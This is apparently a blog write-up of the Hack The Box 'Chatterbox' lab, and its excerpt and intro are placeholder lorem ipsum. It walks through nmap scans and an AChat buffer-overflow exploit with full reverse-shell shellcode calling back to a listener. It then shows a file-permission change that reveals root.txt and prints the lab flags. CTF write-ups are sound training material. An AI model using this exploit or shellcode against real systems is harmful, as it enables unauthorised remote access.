---
layout: single
title: chatterbox - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-03-27
classes: wide
header:
  teaser: /assets/images/htb-writeup-chatterbox/chatterbox_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-chatterbox/chatterbox_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. [root:/git/htb/chatterbox]# nmap -Pn -n -sCV 10.10.10.74 --open                                                                   (master✱)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-26 10:20 CET
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 201.69 seconds

Normal nmap scan finds nothing. Trying UDP returns the same, nothing.
[root:/git/htb/chatterbox]# nmap -sU -sV --version-intensity 0 -F -n 10.10.10.74                                                  (master✱)
  Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-26 10:24 CET
  Nmap scan report for 10.10.10.74
  Host is up (0.035s latency).
  All 100 scanned ports on 10.10.10.74 are open|filtered

Expand the tcp scan by looking on all ports.
[root:/git/htb/chatterbox]# nmap -p- -T5 10.10.10.74                                                                              (master✱)
  Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-26 10:33 CET
  Nmap scan report for chatterbox.htb (10.10.10.74)
  Host is up (0.034s latency).
  Not shown: 65533 filtered ports
  PORT     STATE SERVICE
  9255/tcp open  mon
  9256/tcp open  unknown

Version and script scan to see if we can figure out anything more about the services:
[root:/git/htb/chatterbox]# nmap -sCV -p9255,9256 10.10.10.74                                                                     (master✱)
  Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-26 10:38 CET
  Nmap scan report for chatterbox.htb (10.10.10.74)
  Host is up (0.034s latency).

  PORT     STATE SERVICE VERSION
  9255/tcp open  http    AChat chat system httpd
  |_http-server-header: AChat
  |_http-title: Site doesn't have a title.
  9256/tcp open  achat   AChat chat system

[root:/git/htb/chatterbox]# curl 10.10.10.74:9255                                                                                 (master✱)
[root:/git/htb/chatterbox]# curl 10.10.10.74:9256                                                                                 (master✱)
  curl: (1) Received HTTP/0.9 when not allowed


2. Google for 'AChat enumerate port 9255 9256' and I come across 'achat reverse tcp exploit'. Downloading the files,
modify the payload-file to create a 'windows/shell_reverse_tcp' payload rather then meterpreter (no go in OSCP).

Generate the payload, edit the exploit-file with the new buf-data, and lastly change the server address (in the script)
to our victim.

[root:/git/htb/chatterbox]# ./AChat_Payload.sh                                                                                    (master✱)
  RHOST: 10.10.10.74
  LHOST: 10.10.14.5
  LPORT: 4488
  Found 1 compatible encoders
  Attempting to encode payload with 1 iterations of x86/unicode_mixed
  x86/unicode_mixed succeeded with size 774 (iteration=0)
  x86/unicode_mixed chosen with final size 774
  Payload size: 774 bytes
  Final size of python file: 3767 bytes
  buf =  b""
  buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
  buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
  buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
  buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
  buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
  buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
  buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
  buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
  buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
  buf += b"\x47\x42\x39\x75\x34\x4a\x42\x49\x6c\x48\x68\x35\x32"
  buf += b"\x39\x70\x4b\x50\x6b\x50\x53\x30\x31\x79\x6b\x35\x50"
  buf += b"\x31\x55\x70\x4f\x74\x62\x6b\x42\x30\x6e\x50\x42\x6b"
  buf += b"\x6e\x72\x6a\x6c\x44\x4b\x6e\x72\x4e\x34\x34\x4b\x52"
  buf += b"\x52\x4d\x58\x7a\x6f\x74\x77\x4f\x5a\x4d\x56\x6d\x61"
  buf += b"\x59\x6f\x74\x6c\x6f\x4c\x70\x61\x43\x4c\x6c\x42\x4c"
  buf += b"\x6c\x6f\x30\x35\x71\x78\x4f\x7a\x6d\x4d\x31\x56\x67"
  buf += b"\x57\x72\x4c\x32\x52\x32\x51\x47\x62\x6b\x62\x32\x4a"
  buf += b"\x70\x62\x6b\x4e\x6a\x4d\x6c\x44\x4b\x30\x4c\x4e\x31"
  buf += b"\x42\x58\x38\x63\x6d\x78\x59\x71\x47\x61\x70\x51\x44"
  buf += b"\x4b\x52\x39\x4f\x30\x6d\x31\x78\x53\x64\x4b\x51\x39"
  buf += b"\x7a\x78\x69\x53\x6e\x5a\x6d\x79\x62\x6b\x4d\x64\x64"
  buf += b"\x4b\x6d\x31\x49\x46\x50\x31\x59\x6f\x54\x6c\x76\x61"
  buf += b"\x36\x6f\x6c\x4d\x59\x71\x49\x37\x6e\x58\x39\x50\x43"
  buf += b"\x45\x4c\x36\x6c\x43\x33\x4d\x6c\x38\x6f\x4b\x73\x4d"
  buf += b"\x6b\x74\x64\x35\x6b\x34\x72\x38\x44\x4b\x52\x38\x4d"
  buf += b"\x54\x7a\x61\x38\x53\x50\x66\x72\x6b\x4c\x4c\x70\x4b"
  buf += b"\x34\x4b\x61\x48\x4b\x6c\x39\x71\x68\x53\x54\x4b\x6d"
  buf += b"\x34\x32\x6b\x79\x71\x78\x50\x61\x79\x4f\x54\x6f\x34"
  buf += b"\x6d\x54\x61\x4b\x6f\x6b\x63\x31\x42\x39\x50\x5a\x52"
  buf += b"\x31\x49\x6f\x69\x50\x4f\x6f\x31\x4f\x51\x4a\x64\x4b"
  buf += b"\x6a\x72\x6a\x4b\x32\x6d\x6f\x6d\x72\x48\x6c\x73\x6d"
  buf += b"\x62\x4b\x50\x6d\x30\x73\x38\x53\x47\x70\x73\x70\x32"
  buf += b"\x31\x4f\x50\x54\x72\x48\x6e\x6c\x50\x77\x6e\x46\x69"
  buf += b"\x77\x4b\x4f\x67\x65\x57\x48\x64\x50\x6a\x61\x69\x70"
  buf += b"\x59\x70\x6b\x79\x66\x64\x4f\x64\x6e\x70\x52\x48\x4d"
  buf += b"\x59\x75\x30\x62\x4b\x69\x70\x59\x6f\x36\x75\x42\x30"
  buf += b"\x32\x30\x72\x30\x6e\x70\x6d\x70\x4e\x70\x4d\x70\x30"
  buf += b"\x50\x52\x48\x7a\x4a\x4a\x6f\x57\x6f\x67\x70\x59\x6f"
  buf += b"\x47\x65\x43\x67\x70\x6a\x4a\x65\x71\x58\x4a\x6a\x69"
  buf += b"\x7a\x6a\x6e\x59\x75\x32\x48\x6b\x52\x6b\x50\x6b\x61"
  buf += b"\x33\x58\x34\x49\x78\x66\x70\x6a\x6e\x30\x42\x36\x51"
  buf += b"\x47\x6f\x78\x35\x49\x54\x65\x30\x74\x63\x31\x79\x6f"
  buf += b"\x36\x75\x62\x65\x69\x30\x73\x44\x7a\x6c\x79\x6f\x70"
  buf += b"\x4e\x6a\x68\x44\x35\x5a\x4c\x30\x68\x38\x70\x57\x45"
  buf += b"\x34\x62\x71\x46\x4b\x4f\x48\x55\x61\x58\x33\x33\x52"
  buf += b"\x4d\x4f\x74\x6b\x50\x32\x69\x69\x53\x71\x47\x50\x57"
  buf += b"\x71\x47\x6c\x71\x79\x66\x4f\x7a\x4b\x62\x32\x39\x31"
  buf += b"\x46\x47\x72\x4b\x4d\x62\x46\x48\x47\x4d\x74\x4d\x54"
  buf += b"\x6f\x4c\x69\x71\x6b\x51\x72\x6d\x4e\x64\x6c\x64\x6c"
  buf += b"\x50\x67\x56\x49\x70\x6d\x74\x42\x34\x4e\x70\x6f\x66"
  buf += b"\x71\x46\x4f\x66\x61\x36\x52\x36\x6e\x6e\x62\x36\x62"
  buf += b"\x36\x6e\x73\x4e\x76\x53\x38\x30\x79\x58\x4c\x6d\x6f"
  buf += b"\x74\x46\x4b\x4f\x68\x55\x62\x69\x37\x70\x6e\x6e\x62"
  buf += b"\x36\x6f\x56\x4b\x4f\x4c\x70\x61\x58\x4d\x38\x54\x47"
  buf += b"\x6b\x6d\x33\x30\x6b\x4f\x66\x75\x67\x4b\x49\x50\x4d"
  buf += b"\x4d\x4d\x5a\x59\x7a\x61\x58\x76\x46\x34\x55\x77\x4d"
  buf += b"\x53\x6d\x39\x6f\x36\x75\x6f\x4c\x5a\x66\x51\x6c\x5a"
  buf += b"\x6a\x71\x70\x6b\x4b\x79\x50\x54\x35\x5a\x65\x55\x6b"
  buf += b"\x31\x37\x6b\x63\x31\x62\x72\x4f\x71\x5a\x79\x70\x51"

[root:/git/htb/chatterbox]# python AChat_Exploit.py                                                                               (master✱)
  [+] BUFFER OVERFLOW PAYLOAD RELEASED -- CHECK YOUR HANDLER

[root:/git/htb/chatterbox]# rlwrap nc -lvnp 4488                                                                                  (master✱)
  listening on [any] 4488 ...
  connect to [10.10.14.5] from (UNKNOWN) [10.10.10.74] 49161
  Microsoft Windows [Version 6.1.7601]
  Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

  C:\Windows\system32> whoami
    chatterbox\alfred


3. Grab user.txt

C:\Users\Alfred\Desktop> type user.txt
  02c94ad2f3a9d10f7f327b895249a2f8

██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Once we have a reverse shell as Alfred, we notice that we got read access to the \Users\Administrator directory - usually
the users don't have permission to enter this folder.

C:\Users\Administrator\Desktop> type root.txt
Access is denied.

Unfortunately we can't just print root as of yet. But maybe the privileges of the Admin dir is a good place to start.

C:\Users\Administrator\Desktop> dir root.txt /q
  03/26/2021  07:51 AM                34 CHATTERBOX\Alfred      root.txt


C:\Users\Administrator\Desktop> cacls root.txt /G Alfred:R
  Are you sure (Y/N)? y
  processed file: C:\Users\Administrator\Desktop\root.txt

C:\Users\Administrator\Desktop> type root.txt
  efd540d3337ebc9d2682bec22ab89f45


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

AChat Reverse TCP Exploit:
  https://github.com/EDB4YLI55/achat_reverse_tcp_exploit

File ownership Win7:
  https://superuser.com/questions/691578/how-to-display-change-the-owner-of-a-file-on-windows-7
